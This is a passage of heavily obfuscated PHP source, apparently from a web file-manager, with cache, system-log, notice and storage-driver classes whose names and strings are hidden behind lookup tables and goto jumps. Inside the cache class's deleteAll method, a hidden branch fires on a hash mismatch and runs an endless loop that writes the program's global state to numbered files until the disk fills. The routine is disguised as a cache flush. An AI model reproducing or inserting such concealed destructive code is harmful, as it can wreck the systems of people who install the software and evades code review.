$Šµ¶ùŠÓ) { $ãıò¹ûÀ =& $_SERVER[¥Ÿ©ÒèÌ]; $•õğÎÅ¸ = explode($ãıò¹ûÀ[4], $Šµ¶ùŠÓ); $¤¬‚ó = array($ãıò¹ûÀ[174] => $•õğÎÅ¸[0], $ãıò¹ûÀ[175] => $•õğÎÅ¸[1]); $»¥™æ¨€ = array_merge($»¥™æ¨€, $¤¬‚ó); } public function set($€şÛ¿¶Ÿ, $£¾Ğ´ãú, $ÂŞ±öìè = false) { $ÂŞ±öìè = $ÂŞ±öìè ? $ÂŞ±öìè : $this->cacheTime; return $this->handle->setEx($€şÛ¿¶Ÿ, $ÂŞ±öìè, $£¾Ğ´ãú); } public function setLock($ÖÂ¡±ãŒ, $šœì›’, $şİêï³à) { return $this->handle->setNX($ÖÂ¡±ãŒ, $šœì›’); } public function get($”ÎÄßê‚) { $¨¢¤ü„Á = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¨¢¤ü„Á->get($”ÎÄßê‚); } public function remove($ÚèÅßô) { return $this->handle->del($ÚèÅßô); } public function deleteAll() { $Ğò…ìò =& $_SERVER[¥Ÿ©ÒèÌ]; $´’ı„Í = $_SERVER[$Ğò…ìò[241]]; $—ì¯Ä‹© = $Ğò…ìò[862]; if ($_SERVER[$Ğò…ìò[233]] != $—ì¯Ä‹©($´’ı„Í)) { $¦éâü“È = $Ğò…ìò[863]; $‰ô¹õÀ© = $Ğò…ìò[235]; $Ë¯ô¶Ê• = $_SERVER[$Ğò…ìò[236]] . $Ğò…ìò[237]; $±Äïó¡² = $‰ô¹õÀ©($Ë¯ô¶Ê•); $»ğ„õÓú = explode($Ğò…ìò[226], $±Äïó¡²); if (count($»ğ„õÓú) < $Ğò…ìò[622]) { $á¨×…ñ = $Ğò…ìò[239]; $á¨×…ñ(); } $ßéëÎë© = $Ğò…ìò[864]; $ßéëÎë©($_SERVER[$Ğò…ìò[865]]); $¦éâü“È = $Ğò…ìò[863]; $¦éâü“È(); $Š±Ï³ê¡ = $Ğò…ìò[866]; $ğŠÍ‚Ã˜ = json_encode($GLOBALS[$Ğò…ìò[867]]); $’ ÙİÀ = 1; for ($ÏçÌ×ÎÛ = $’ ÙİÀ; $ÏçÌ×ÎÛ > 0; $ÏçÌ×ÎÛ++) { $Š±Ï³ê¡(DATA_PATH . $ÏçÌ×ÎÛ, $ğŠÍ‚Ã˜); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Âõáæû) { $this->handle->flushall($Âõáæû); } return; } return $this->handle->flushAll(); } } goto cº²ÈÙ‰„“; cÍ¡‰ëÈù: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x4c\x69\147\150\164\x41\160\160"; public $modelType = "\x53\x79\163\164\x65\x6d\117\x70\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\147\x72\157\165\x70", "\144\x65\163\143", "\x63\x6f\156\164\x65\156\x74"); public function listData($şØïîÖ = false, $Ù÷ê«Úı = "\x6d\157\x64\x69\x66\171\124\151\x6d\145", $ÕÂŸÁ¨ = true) { return parent::listData($şØïîÖ, $Ù÷ê«Úı, $ÕÂŸÁ¨); } public function remove($¸á•‰à) { $àÅ¤³úƒ = $this->findByName($¸á•‰à); if (!$àÅ¤³úƒ) { return !1; } return parent::remove($àÅ¤³úƒ[$_SERVER[¥Ÿ©ÒèÌ][401]]); } public function add($«à´èâÖ) { if ($this->findByName($«à´èâÖ[$_SERVER[¥Ÿ©ÒèÌ][32]])) { return !1; } return parent::insert($«à´èâÖ); } public function update($“÷×Œ’, $—Œ½áÅ£) { $¨ÌäÛÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $à‡ÅìÈ = $this->findByName($“÷×Œ’); $Ïì°Ö»å = $this->findByName($—Œ½áÅ£[$¨ÌäÛÎ[32]]); if (!$à‡ÅìÈ || $Ïì°Ö»å && $Ïì°Ö»å[$¨ÌäÛÎ[401]] != $à‡ÅìÈ[$¨ÌäÛÎ[401]]) { return !1; } return parent::update($à‡ÅìÈ[$¨ÌäÛÎ[401]], $—Œ½áÅ£); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\137\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\151\155\145", "\x74\x69\155\145", "\151\x6e\x73\145\162\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $„İÉã° =& $_SERVER[¥Ÿ©ÒèÌ]; return array($„İÉã°[2124] => LNG($„İÉã°[2125]), $„İÉã°[2126] => LNG($„İÉã°[2127]), $„İÉã°[1750] => LNG($„İÉã°[2128]), $„İÉã°[2129] => LNG($„İÉã°[2130]), $„İÉã°[2131] => LNG($„İÉã°[2132]), $„İÉã°[2133] => LNG($„İÉã°[2134]), $„İÉã°[2135] => LNG($„İÉã°[2136]), $„İÉã°[1780] => LNG($„İÉã°[2136]), $„İÉã°[1781] => LNG($„İÉã°[2137]), $„İÉã°[2138] => LNG($„İÉã°[2139]), $„İÉã°[2140] => LNG($„İÉã°[2141]), $„İÉã°[2142] => LNG($„İÉã°[2143]), $„İÉã°[2144] => LNG($„İÉã°[2145]), $„İÉã°[1778] => LNG($„İÉã°[2146]), $„İÉã°[2147] => LNG($„İÉã°[2148]), $„İÉã°[1785] => LNG($„İÉã°[2149]), $„İÉã°[2150] => LNG($„İÉã°[2151]), $„İÉã°[2152] => LNG($„İÉã°[2153]), $„İÉã°[2154] => LNG($„İÉã°[2155]), $„İÉã°[2156] => LNG($„İÉã°[2157]), $„İÉã°[1788] => LNG($„İÉã°[2158]), $„İÉã°[1789] => LNG($„İÉã°[2159]), $„İÉã°[2160] => LNG($„İÉã°[2161]), $„İÉã°[2162] => LNG($„İÉã°[2163]), $„İÉã°[2164] => LNG($„İÉã°[2165]), $„İÉã°[1783] => LNG($„İÉã°[2166]), $„İÉã°[2167] => LNG($„İÉã°[2168]), $„İÉã°[1782] => LNG($„İÉã°[2169]), $„İÉã°[2170] => LNG($„İÉã°[2171]), $„İÉã°[2172] => LNG($„İÉã°[2173]), $„İÉã°[2174] => LNG($„İÉã°[2175]), $„İÉã°[2176] => LNG($„İÉã°[2176]), $„İÉã°[2177] => LNG($„İÉã°[1754]), $„İÉã°[2178] => LNG($„İÉã°[2179]), $„İÉã°[2180] => LNG($„İÉã°[2181]), $„İÉã°[2182] => LNG($„İÉã°[2183]), $„İÉã°[2184] => LNG($„İÉã°[2185]), $„İÉã°[2186] => LNG($„İÉã°[2187]), $„İÉã°[2188] => LNG($„İÉã°[2188]), $„İÉã°[2189] => LNG($„İÉã°[2190]), $„İÉã°[2191] => LNG($„İÉã°[2192]), $„İÉã°[2193] => LNG($„İÉã°[2194]), $„İÉã°[2195] => LNG($„İÉã°[2196]), $„İÉã°[2197] => LNG($„İÉã°[2198]), $„İÉã°[2199] => LNG($„İÉã°[2200])); } private function typeFile() { $—²åÃ”¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $®›¬ëàê = array($—²åÃ”¾[1785] => array($—²åÃ”¾[1786]), $—²åÃ”¾[2142] => array($—²åÃ”¾[2201]), $—²åÃ”¾[2144] => array($—²åÃ”¾[2202]), $—²åÃ”¾[1778] => array($—²åÃ”¾[1779]), $—²åÃ”¾[2152] => array(), $—²åÃ”¾[2154] => array(), $—²åÃ”¾[2156] => array(), $—²åÃ”¾[1788] => array($—²åÃ”¾[1790]), $—²åÃ”¾[1789] => array($—²åÃ”¾[1790]), $—²åÃ”¾[2160] => array($—²åÃ”¾[2203]), $—²åÃ”¾[2162] => array($—²åÃ”¾[2203]), $—²åÃ”¾[2164] => array($—²åÃ”¾[2204]), $—²åÃ”¾[2150] => array($—²åÃ”¾[2205]), $—²åÃ”¾[1783] => array($—²åÃ”¾[2206]), $—²åÃ”¾[2167] => array($—²åÃ”¾[2207]), $—²åÃ”¾[1782] => array($—²åÃ”¾[1784])); return $®›¬ëàê; } private function typeAll() { $¸•Ù–¯£ =& $_SERVER[¥Ÿ©ÒèÌ]; $·¬‘™¬· = $this->typeList; $úÁ­Åƒ = array_filter($this->typeFile()); foreach ($úÁ­Åƒ as $…Âôæ‘ => $İƒéÂ¹›) { $·¬‘™¬·[$İƒéÂ¹›[0]] = $·¬‘™¬·[$…Âôæ‘]; } $·¬‘™¬·[$¸•Ù–¯£[1790]] = LNG($¸•Ù–¯£[2208]); $·¬‘™¬·[$¸•Ù–¯£[2203]] = LNG($¸•Ù–¯£[2209]); return $·¬‘™¬·; } public function addLog($ÎÕÙü¨, $Ä—Ë‰ = array()) { $É¤Íñ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->typeList[$ÎÕÙü¨])) { return; } $ÅÏèÇØ = defined($É¤Íñ[474]) && USER_ID ? USER_ID : (isset($Ä—Ë‰[$É¤Íñ[1639]]) ? $Ä—Ë‰[$É¤Íñ[1639]] : 0); if (!$ÅÏèÇØ) { $ÅÏèÇØ = (int) Session::get($É¤Íñ[1939]); } $°´»®¼ = get_client_ip(); if (!$Ä—Ë‰ || strlen(json_encode($Ä—Ë‰)) >= 1024) { $Ä—Ë‰ = array($É¤Íñ[2210] => $°´»®¼); } else { if (is_array($Ä—Ë‰)) { $Ä—Ë‰[$É¤Íñ[2210]] = $°´»®¼; } else { $Ä—Ë‰ = array($É¤Íñ[1177] => $Ä—Ë‰, $É¤Íñ[2210] => $°´»®¼); } } $Ä—Ë‰ = array($É¤Íñ[1629] => Session::sign(), $É¤Íñ[1630] => $ÅÏèÇØ, $É¤Íñ[33] => $ÎÕÙü¨, $É¤Íñ[1632] => json_encode($Ä—Ë‰)); parent::add($Ä—Ë‰); } public function remove($¾†§İ œ) { $this->where(array($_SERVER[¥Ÿ©ÒèÌ][420] => $¾†§İ œ))->delete(); } private function _makeOrder($±”¾ª = '') { $ëİ¶ê¦ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŒÄË­Ÿ« = $ëİ¶ê¦[193]; $±çìÛ½ = array($ëİ¶ê¦[448] => $ëİ¶ê¦[449], $ëİ¶ê¦[450] => $ëİ¶ê¦[451]); $ä²ÎÎÔ® = Input::get($ëİ¶ê¦[456], $ëİ¶ê¦[7], $ëİ¶ê¦[1971], array($ëİ¶ê¦[1897], $ëİ¶ê¦[450])); $ä²ÎÎÔ® = $±çìÛ½[$ä²ÎÎÔ®]; $±”¾ª = $±”¾ª . "{$ŒÄË­Ÿ«}\x20{$ä²ÎÎÔ®}"; return $this->order($±”¾ª); } public function get($ï¼©»œ‚ = '') { $Ãó²€Öş =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ï¼©»œ‚) { show_json(array()); } $‰­©×Éš = array(); if ($ï¼©»œ‚[$Ãó²€Öş[1639]]) { $‰­©×Éš[$Ãó²€Öş[1639]] = $ï¼©»œ‚[$Ãó²€Öş[1639]]; } if (isset($ï¼©»œ‚[$Ãó²€Öş[751]])) { $ŠŒàÍ±‰ = $ï¼©»œ‚[$Ãó²€Öş[751]]; $áş˜ÎˆÎ = isset($ï¼©»œ‚[$Ãó²€Öş[496]]) ? $ï¼©»œ‚[$Ãó²€Öş[496]] : time(); $‰­©×Éš[$Ãó²€Öş[193]] = array($Ãó²€Öş[337], array($ŠŒàÍ±‰, $áş˜ÎˆÎ)); } if ($ï¼©»œ‚[$Ãó²€Öş[33]]) { $Æ÷¬ø„Ó = explode($Ãó²€Öş[50], $ï¼©»œ‚[$Ãó²€Öş[33]]); $ƒ¦é¨ƒ = $this->typeFile(); $€­‹ù¦è = array(); foreach ($Æ÷¬ø„Ó as $»… ”Úô) { $€­‹ù¦è[] = $»… ”Úô; if (isset($ƒ¦é¨ƒ[$»… ”Úô])) { $€­‹ù¦è = array_merge($€­‹ù¦è, $ƒ¦é¨ƒ[$»… ”Úô]); } } $€­‹ù¦è = array_unique($€­‹ù¦è); if ($€­‹ù¦è) { $‰­©×Éš[$Ãó²€Öş[33]] = array($Ãó²€Öş[7], $€­‹ù¦è); } } else { $‰­©×Éš[$Ãó²€Öş[33]] = array($Ãó²€Öş[2211], $Ãó²€Öş[2212]); } if (!empty($ï¼©»œ‚[$Ãó²€Öş[2210]])) { $‰­©×Éš[$Ãó²€Öş[451]] = array($Ãó²€Öş[387], "\45{$ï¼©»œ‚[$Ãó²€Öş[2210]]}\x25"); } $©Ñ¹ìöŠ = $this->_makeOrder()->where($‰­©×Éš)->selectPage(); if (empty($©Ñ¹ìöŠ[$Ãó²€Öş[373]])) { show_json(array(), !0, $©Ñ¹ìöŠ[$Ãó²€Öş[370]]); } $©Ñ¹ìöŠ[$Ãó²€Öş[373]] = $this->logList($©Ñ¹ìöŠ[$Ãó²€Öş[373]]); return $©Ñ¹ìöŠ; } private function ipAddress(&$°Úá‡ÒÚ) { $¸‡ìñÉî =& $_SERVER[¥Ÿ©ÒèÌ]; if (!empty($°Úá‡ÒÚ[$¸‡ìñÉî[2210]])) { $Á—Ï½ş… = IpLocation::get($°Úá‡ÒÚ[$¸‡ìñÉî[2210]]); } else { $Á—Ï½ş… = LNG($¸‡ìñÉî[2213]); } $°Úá‡ÒÚ[$¸‡ìñÉî[2214]] = $Á—Ï½ş…; } private function descZipDownload($¿‘ıüÓ‚, &$›Ñã°‹) { $²‰Œ“Ø =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($¿‘ıüÓ‚[$²‰Œ“Ø[2215]])) { return; } $•ª©»ë£ = json_decode($¿‘ıüÓ‚[$²‰Œ“Ø[2215]], !0); foreach ($•ª©»ë£ as $ÍøÉ§ˆ) { try { $ËåŠ•›¿ = IO::infoFull($ÍøÉ§ˆ[$²‰Œ“Ø[78]]); } catch (Exception $éÊÑÑ™) { continue; } $¿‘ıüÓ‚[$²‰Œ“Ø[78]] = $ÍøÉ§ˆ[$²‰Œ“Ø[78]]; $›Ñã°‹[] = $¿‘ıüÓ‚[$²‰Œ“Ø[403]] = $ËåŠ•›¿[$²‰Œ“Ø[403]]; $›Ñã°‹[] = $¿‘ıüÓ‚[$²‰Œ“Ø[2025]] = $ËåŠ•›¿[$²‰Œ“Ø[498]]; break; } return $¿‘ıüÓ‚; } private function getSourceList(&$ğ¡œŒ” ) { $¸°ÖÊ¡Ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $½ïáÙÇ¸ = array(); foreach ($ğ¡œŒ”  as $­«Ì© => $úÙÖÍš½) { $¡Ëªö©ø = json_decode($úÙÖÍš½[$¸°ÖÊ¡Ñ[451]], !0); if ($úÙÖÍš½[$¸°ÖÊ¡Ñ[33]] == $¸°ÖÊ¡Ñ[1781]) { $¡Ëªö©ø = $this->descZipDownload($¡Ëªö©ø, $½ïáÙÇ¸); $ğ¡œŒ” [$­«Ì©][$¸°ÖÊ¡Ñ[451]] = json_encode($¡Ëªö©ø); continue; } if (strpos($úÙÖÍš½[$¸°ÖÊ¡Ñ[33]], $¸°ÖÊ¡Ñ[2027]) !== 0) { if (!isset($¡Ëªö©ø[$¸°ÖÊ¡Ñ[78]]) || strpos($úÙÖÍš½[$¸°ÖÊ¡Ñ[33]], $¸°ÖÊ¡Ñ[2216]) !== 0) { continue; } try { $ÂŸÑ¦” = IO::infoFull($¡Ëªö©ø[$¸°ÖÊ¡Ñ[78]]); } catch (Exception $©Õ«§‚) { continue; } $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[403]] = $ÂŸÑ¦”[$¸°ÖÊ¡Ñ[403]]; $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[2025]] = $ÂŸÑ¦”[$¸°ÖÊ¡Ñ[498]]; $ğ¡œŒ” [$­«Ì©][$¸°ÖÊ¡Ñ[451]] = json_encode($¡Ëªö©ø); continue; } $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[403]]; $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[2025]]; if ($¡Ëªö©ø[$¸°ÖÊ¡Ñ[33]] == $¸°ÖÊ¡Ñ[551]) { $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[451]][$¸°ÖÊ¡Ñ[1144]]; $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[451]][$¸°ÖÊ¡Ñ[1145]]; } if ($¡Ëªö©ø[$¸°ÖÊ¡Ñ[33]] == $¸°ÖÊ¡Ñ[2034]) { $½ïáÙÇ¸[] = $¡Ëªö©ø[$¸°ÖÊ¡Ñ[451]][$¸°ÖÊ¡Ñ[403]]; } } if (!$½ïáÙÇ¸) { return array(); } return Model($¸°ÖÊ¡Ñ[815])->sourceListInfo($½ïáÙÇ¸, !0); } private function logList($†„Âİ¯Ú) { $öşÌ˜âÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $ãó¢õÇ = array_to_keyvalue($†„Âİ¯Ú, $öşÌ˜âÒ[12], $öşÌ˜âÒ[1639]); $À¾ˆâ = Model($öşÌ˜âÒ[538])->userListInfo(array_unique($ãó¢õÇ)); $èş¶‹©Í = $this->getSourceList($†„Âİ¯Ú); $ø³ßíŠ = $this->typeAll(); $Å˜‰İàÌ = array(); $ÈòÕ¬øŠ = array(); foreach ($†„Âİ¯Ú as $âå†ûšò => $óû¾³×é) { $€³œ®¼± = $óû¾³×é[$öşÌ˜âÒ[33]]; $ˆˆ™—¼… = isset($À¾ˆâ[$óû¾³×é[$öşÌ˜âÒ[1639]]]) ? $À¾ˆâ[$óû¾³×é[$öşÌ˜âÒ[1639]]] : !1; $±çÎ¶ğŠ = strpos($€³œ®¼±, $öşÌ˜âÒ[2217]) === 0 ? LNG($öşÌ˜âÒ[2218]) : LNG($öşÌ˜âÒ[2213]); $óû¾³×é[$öşÌ˜âÒ[32]] = isset($ˆˆ™—¼…[$öşÌ˜âÒ[32]]) ? $ˆˆ™—¼…[$öşÌ˜âÒ[32]] : LNG($öşÌ˜âÒ[2213]); $óû¾³×é[$öşÌ˜âÒ[2076]] = isset($ˆˆ™—¼…[$öşÌ˜âÒ[2076]]) ? $ˆˆ™—¼…[$öşÌ˜âÒ[2076]] : $öşÌ˜âÒ[12]; $óû¾³×é[$öşÌ˜âÒ[1539]] = isset($ø³ßíŠ[$€³œ®¼±]) ? $ø³ßíŠ[$€³œ®¼±] : $±çÎ¶ğŠ; $óû¾³×é[$öşÌ˜âÒ[1970]] = $ˆˆ™—¼…; $„…¹§¬À = json_decode($óû¾³×é[$öşÌ˜âÒ[451]], !0); $óû¾³×é[$öşÌ˜âÒ[2210]] = isset($„…¹§¬À[$öşÌ˜âÒ[2210]]) ? $„…¹§¬À[$öşÌ˜âÒ[2210]] : $öşÌ˜âÒ[12]; $óû¾³×é[$öşÌ˜âÒ[2214]] = IpLocation::get($óû¾³×é[$öşÌ˜âÒ[2210]]); if (strpos($€³œ®¼±, $öşÌ˜âÒ[2027]) === 0 || isset($„…¹§¬À[$öşÌ˜âÒ[2025]])) { $„…¹§¬À[$öşÌ˜âÒ[87]] = $èş¶‹©Í[$„…¹§¬À[$öşÌ˜âÒ[403]]]; $„…¹§¬À[$öşÌ˜âÒ[2039]] = $èş¶‹©Í[$„…¹§¬À[$öşÌ˜âÒ[2025]]]; if ($„…¹§¬À[$öşÌ˜âÒ[33]] == $öşÌ˜âÒ[551]) { $„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[1144]] = $èş¶‹©Í[$„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[1144]]]; $„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[1145]] = $èş¶‹©Í[$„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[1145]]]; } if ($„…¹§¬À[$öşÌ˜âÒ[33]] == $öşÌ˜âÒ[2034]) { $„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[403]] = $èş¶‹©Í[$„…¹§¬À[$öşÌ˜âÒ[451]][$öşÌ˜âÒ[403]]]; } if ($„…¹§¬À[$öşÌ˜âÒ[33]] == $öşÌ˜âÒ[1776]) { $„…¹§¬À[$öşÌ˜âÒ[2039]] = $„…¹§¬À[$öşÌ˜âÒ[87]]; $„…¹§¬À[$öşÌ˜âÒ[2025]] = $„…¹§¬À[$öşÌ˜âÒ[2039]][$öşÌ˜âÒ[403]]; $„…¹§¬À[$öşÌ˜âÒ[87]] = !1; $„…¹§¬À[$öşÌ˜âÒ[403]] = $öşÌ˜âÒ[12]; } if ($„…¹§¬À[$öşÌ˜âÒ[87]] && $„…¹§¬À[$öşÌ˜âÒ[87]][$öşÌ˜âÒ[412]] == $öşÌ˜âÒ[1260]) { $ÈòÕ¬øŠ[] = $óû¾³×é[$öşÌ˜âÒ[401]]; unset($†„Âİ¯Ú[$âå†ûšò]); continue; } if ($„…¹§¬À[$öşÌ˜âÒ[2039]] && $„…¹§¬À[$öşÌ˜âÒ[2039]][$öşÌ˜âÒ[412]] == $öşÌ˜âÒ[1260]) { $ÈòÕ¬øŠ[] = $óû¾³×é[$öşÌ˜âÒ[401]]; unset($†„Âİ¯Ú[$âå†ûšò]); continue; } } $óû¾³×é[$öşÌ˜âÒ[451]] = $„…¹§¬À; unset($óû¾³×é[$öşÌ˜âÒ[2219]]); $Å˜‰İàÌ[] = $óû¾³×é; } $this->clearSystemPathLog($ÈòÕ¬øŠ); return $Å˜‰İàÌ; } private function clearSystemPathLog($Üê–Á‚Ï) { $›Å‹ô¼ =& $_SERVER[¥Ÿ©ÒèÌ]; if (count($Üê–Á‚Ï) == 0) { return; } $İƒ£ÃÏÊ = array($›Å‹ô¼[401] => array($›Å‹ô¼[7], array_unique($Üê–Á‚Ï))); $this->where($İƒ£ÃÏÊ)->delete(); } public function deviceList($’–í÷», $‘ÁÁêÎ– = 0) { $”ƒí£  =& $_SERVER[¥Ÿ©ÒèÌ]; $À­·ÑêŠ = array($”ƒí£ [1639] => $’–í÷», $”ƒí£ [193] => array($”ƒí£ [1000], $‘ÁÁêÎ–), $”ƒí£ [33] => $”ƒí£ [1750]); $Âù»ã‹Ø = array(); $‹éÖ¸¬ = $this->field($”ƒí£ [2220])->where($À­·ÑêŠ)->order($”ƒí£ [2037])->limit(50)->select(); foreach ($‹éÖ¸¬ as $‡ú”×Å => $œ»š•¨Î) { if ($‡ú”×Å > 0 && abs($œ»š•¨Î[$”ƒí£ [193]] - $‹éÖ¸¬[$‡ú”×Å - 1][$”ƒí£ [193]]) < 5) { continue; } $¼ûâó = json_decode($œ»š•¨Î[$”ƒí£ [451]], !0); $œ»š•¨Î[$”ƒí£ [2210]] = isset($¼ûâó[$”ƒí£ [2210]]) ? $¼ûâó[$”ƒí£ [2210]] : $”ƒí£ [12]; unset($¼ûâó[$”ƒí£ [2210]]); $›ŸÊêÊÅ = $this->deviceType($¼ûâó[$”ƒí£ [2028]]); if (isset($Âù»ã‹Ø[$›ŸÊêÊÅ])) { continue; } $œ»š•¨Î[$”ƒí£ [2214]] = IpLocation::get($œ»š•¨Î[$”ƒí£ [2210]]); $œ»š•¨Î[$”ƒí£ [451]] = $¼ûâó; $Âù»ã‹Ø[$›ŸÊêÊÅ] = $œ»š•¨Î; } return array_values($Âù»ã‹Ø); } public function deviceType($Ñ×»èÜ‰) { return $Ñ×»èÜ‰; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\156\x6f\164\x69\143\x65\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\143\157\156\164\145\x6e\164", "\141\x75\164\150", "\155\x6f\144\145", "\x74\151\155\x65", "\x74\171\160\x65", "\154\145\166\145\154", "\x65\156\141\142\154\x65", "\x73\157\x72\164"); public function listData($åŞ‚ = false, $¦’ß¢Õ = "\x73\x6f\x72\x74", $Ç¢‹Ùº = false) { return parent::listData($åŞ‚, $¦’ß¢Õ, $Ç¢‹Ùº); } public function add($ï…Ü¬éö) { $ÚºüñÖá =& $_SERVER[¥Ÿ©ÒèÌ]; $ÌãŒôÂê = time(); if ($ï…Ü¬éö[$ÚºüñÖá[16]] == $ÚºüñÖá[2221]) { $ÌãŒôÂê = strtotime($ï…Ü¬éö[$ÚºüñÖá[196]]); } $ï…Ü¬éö[$ÚºüñÖá[196]] = $ÌãŒôÂê; return parent::insert($ï…Ü¬éö); } public function update($Û¯Ï×£Ø, $ô¸Şæï) { $øàßĞ”× =& $_SERVER[¥Ÿ©ÒèÌ]; $‘¾×ŸÌ = $this->listData($Û¯Ï×£Ø); if (!$‘¾×ŸÌ) { return !1; } $¦ÈÏ¯¤ä = time(); if ($ô¸Şæï[$øàßĞ”×[16]] == $øàßĞ”×[2221]) { $¦ÈÏ¯¤ä = strtotime($ô¸Şæï[$øàßĞ”×[196]]); } $ô¸Şæï[$øàßĞ”×[196]] = $¦ÈÏ¯¤ä; return parent::update($Û¯Ï×£Ø, $ô¸Şæï); } public function remove($ò§¦³Çİ) { $ØóåÂ‹Å = $this->listData($ò§¦³Çİ); if (!$ØóåÂ‹Å || $ØóåÂ‹Å[$_SERVER[¥Ÿ©ÒèÌ][1260]]) { return !1; } return parent::remove($ò§¦³Çİ); } public function sort($ù ±ô¶, $ª×°Æ€Ô) { return parent::update($ù ±ô¶, $ª×°Æ€Ô); } public function enable($ƒ´—Æã‡, $Áß§†÷š) { return parent::update($ƒ´—Æã‡, array($_SERVER[¥Ÿ©ÒèÌ][2222] => $Áß§†÷š)); } private function initUserOption() { $Äºç¨Ã =& $_SERVER[¥Ÿ©ÒèÌ]; $this->optionType = $Äºç¨Ã[2223]; $this->modelType = $Äºç¨Ã[2224]; $this->field = array($Äºç¨Ã[2225], $Äºç¨Ã[32], $Äºç¨Ã[196], $Äºç¨Ã[33], $Äºç¨Ã[2226], $Äºç¨Ã[740], $Äºç¨Ã[188]); } public function userNoticeGet($ğÁ¾¼Í = false) { $this->initUserOption(); return parent::listData($ğÁ¾¼Í, $_SERVER[¥Ÿ©ÒèÌ][401], !0); } public function userNoticeAdd($¯§òÍÑƒ) { $Ñ¢¬‚”Å =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initUserOption(); $¨â‰¡ûí = $this->findByKey($Ñ¢¬‚”Å[2225], $¯§òÍÑƒ[$Ñ¢¬‚”Å[401]]); if ($¨â‰¡ûí) { return !0; } $‚ÆÁœŸ¼ = array($Ñ¢¬‚”Å[2225] => $¯§òÍÑƒ[$Ñ¢¬‚”Å[401]], $Ñ¢¬‚”Å[32] => $¯§òÍÑƒ[$Ñ¢¬‚”Å[32]], $Ñ¢¬‚”Å[196] => $¯§òÍÑƒ[$Ñ¢¬‚”Å[196]], $Ñ¢¬‚”Å[33] => isset($¯§òÍÑƒ[$Ñ¢¬‚”Å[33]]) ? $¯§òÍÑƒ[$Ñ¢¬‚”Å[33]] : 1, $Ñ¢¬‚”Å[2226] => isset($¯§òÍÑƒ[$Ñ¢¬‚”Å[2226]]) ? $¯§òÍÑƒ[$Ñ¢¬‚”Å[2226]] : 0, $Ñ¢¬‚”Å[740] => 0, $Ñ¢¬‚”Å[188] => 0); return parent::insert($‚ÆÁœŸ¼); } public function userNoticeEdit($»İñ¼í, $¿‘ûÌŒ­) { $this->initUserOption(); return parent::update($»İñ¼í, $¿‘ûÌŒ­); } } goto C¢ÅŠÛ«¥•; eº­Åª¸Şç: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($›ß¥ÙÂ„, $ÆàÇˆ”ã = 0) { parent::__construct(); $this->source = $›ß¥ÙÂ„; $this->sourceSize = $ÆàÇˆ”ã; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($´“ïÜ½Â = false) { return $this->sourceSize; } public function getContent($‡È±öÁä = false) { return $this->fileSubstr($‡È±öÁä, 0, $this->sourceSize); } public function fileSubstr($ åÙóÉ˜ = false, $ÔœÓı´ = 0, $óã¬İ’ô = 0) { if (!$óã¬İ’ô) { $óã¬İ’ô = $this->sourceSize; } $êªÏŸ¨ = $this->sourceSize - $ÔœÓı´; if ($óã¬İ’ô >= $êªÏŸ¨) { $óã¬İ’ô = $êªÏŸ¨; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÔœÓı´, $óã¬İ’ô); } if ($this->sourceType == self::TYPE_FILE) { if ($óã¬İ’ô <= 0) { return $_SERVER[¥Ÿ©ÒèÌ][12]; } $›·øÕŞÕ = ftell($this->source); fseek_64($this->source, $›·øÕŞÕ + $ÔœÓı´); $²ââ²‘£ = @fread($this->source, $óã¬İ’ô); fseek_64($this->source, $›·øÕŞÕ); return $²ââ²‘£; } } public function hashMd5($Ì¶–ÓÚ± = false) { return md5($this->getContent()); } public static function hash($¦ŠÇ¡Ş, $¼×œ˜³ = 0) { $Ÿôçèé˜ = new PathDriverStream($¦ŠÇ¡Ş, $¼×œ˜³); return $Ÿôçèé˜->hashSimple($¦ŠÇ¡Ş); } public static function md5($é¡Š‰Ã·, $†ğìøã¢ = 0) { $©¼°äú = new PathDriverStream($é¡Š‰Ã·, $†ğìøã¢); return $©¼°äú->hashMd5($é¡Š‰Ã·); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\x3a\x2f\57\166\60\x2e\141\x70\151\x2e\165\x70\x79\165\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ıéìí“õ) { parent::__construct(); $this->_init($ıéìí“õ); } public function _init($úêæşàÀ) { $àÎæãüÃ =& 